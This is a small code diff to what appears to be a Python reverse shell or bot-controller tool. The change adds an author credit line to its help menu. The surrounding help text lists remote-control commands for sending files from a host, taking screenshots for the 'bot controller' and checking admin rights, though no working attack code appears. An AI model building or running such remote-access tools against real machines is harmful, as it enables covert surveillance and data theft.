@@ -18,6 +18,8 @@ PORT = 54321
 def get_help():
     return '''
 #########################################################################################
+@ Reverse_Shell by F4d0
+
 OPTIONS:
     
     send <path>     --> send file to the remote host
@@ -26,6 +28,7 @@ OPTIONS:
     screenshot      --> takes a screenshot from the host and sends to the bot controller
     isadmin         --> tests if the bot controller has admin permissions on the host 
     q               --> quit
+    
 #########################################################################################
 '''
 
